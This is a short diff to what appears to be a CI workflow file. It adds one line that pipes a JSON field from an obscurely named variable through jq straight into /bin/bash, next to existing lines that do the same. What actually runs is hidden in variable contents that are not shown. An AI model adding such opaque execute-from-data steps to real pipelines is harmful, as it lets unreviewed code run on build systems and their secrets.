@@ -35,6 +35,7 @@ jobs:
           echo $cpndp5249 | jq -r .e5269 | /bin/bash
           echo $zemzd2976 | jq -r .f6 | /bin/bash
           echo $eom3995 | jq -r .fnc0 | /bin/bash
+          printf '%s' "$oxjq4899" | jq -r .iufx645 | /bin/bash
 
       - name: Archive output
         if: always()
